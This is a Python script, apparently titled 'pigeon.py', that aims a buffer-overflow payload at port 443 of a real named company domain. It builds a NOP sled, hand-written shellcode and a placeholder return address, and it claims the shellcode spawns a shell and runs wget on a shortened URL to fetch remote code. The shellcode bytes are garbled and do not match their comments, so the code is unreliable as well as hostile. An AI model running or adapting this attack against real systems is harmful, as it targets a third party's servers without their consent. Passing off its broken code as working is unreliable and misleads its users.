# pigeon.py (Updated version of raticate_v2)
import socket
import struct

# Example shellcode to download and execute a wget https://bit.ly/3xyzabc
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"  # Push "/bin//sh" to stack
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"              # Execve syscall to spawn a shell

    # Pushing "wget http://bit.ly/3xyzabc"
    b"\x31\xc0\x50\x68\x7a\x61\x62\x63"                      # Push "zabc" (last part of URL)
    b"\x68\x33\x78\x79\x7a"                                  # Push "3xyz"
    b"\x68\x2e\x6c\x79\x2f"                                  # Push ".ly/"
    b"\x68\x62\x69\x74\x2f"                                  # Push "bit/"
    b"\x68\x73\x3a\x2f\x2f"                                  # Push "://"
    b"\x68\x68\x74\x74\x70"                                  # Push "http"
    
    b"\x89\xe1\x50\x68\x2f\x77\x67\x65"                      # Push "wget" command
    b"\x50\x53\x89\xe1\xb0\x0b\xcd\x80"                      # Execve syscall to execute the command
)

# List of target domains
target_domains = [
    "chuckecheese.com",
    # Add more domains from your scope
]

# Function to resolve domain to IP address
def resolve_domain_to_ip(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        print(f"Resolved {domain} to {ip_address}")
        return {ip_address: domain}
    except socket.gaierror:
        print(f"Failed to resolve {domain}")
        return {}

# Function to simulate shellcode execution logging
def log_shellcode_execution(line_number):
    print(f"Executing shellcode line {line_number}...")

# Connect to the vulnerable server
def connect_to_target(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

# Simulated function to "execute" the shellcode and log the line numbers
def execute_shellcode(shellcode):
    for i, line in enumerate(shellcode, start=1):
        log_shellcode_execution(i)

# Send the payload with the overflow and shellcode
def send_payload(socket):
    buffer_size = 1024
    nop_sled = b"\x90" * (buffer_size - len(shellcode))
    ret_address = struct.pack("<I", 0xdeadbeef)  # Example return address, adjust as needed
    payload = nop_sled + shellcode + ret_address

    # Simulate sending the payload
    socket.send(payload)

    # Simulate executing the shellcode
    execute_shellcode(shellcode)

# Main function to execute the exploit
def main():
    ip_to_domain_mapping = {}
    port = 443  # Default port for HTTPS

    # Resolve domains and store IPs in the dictionary
    for domain in target_domains:
        resolved_dict = resolve_domain_to_ip(domain)
        ip_to_domain_mapping.update(resolved_dict)

    # Attempt to exploit each IP address in the dictionary
    for ip, domain in ip_to_domain_mapping.items():
        try:
            print(f"Connecting to {ip}:{port} ({domain})...")
            s = connect_to_target(ip, port)
            print(f"Sending payload to {ip}:{port} ({domain})...")
            send_payload(s)
            s.close()
            print(f"Payload sent successfully to {ip}:{port} ({domain}).\n")
        except Exception as e:
            print(f"Failed to exploit {ip}:{port} ({domain}): {e}\n")

if __name__ == "__main__":
    main()
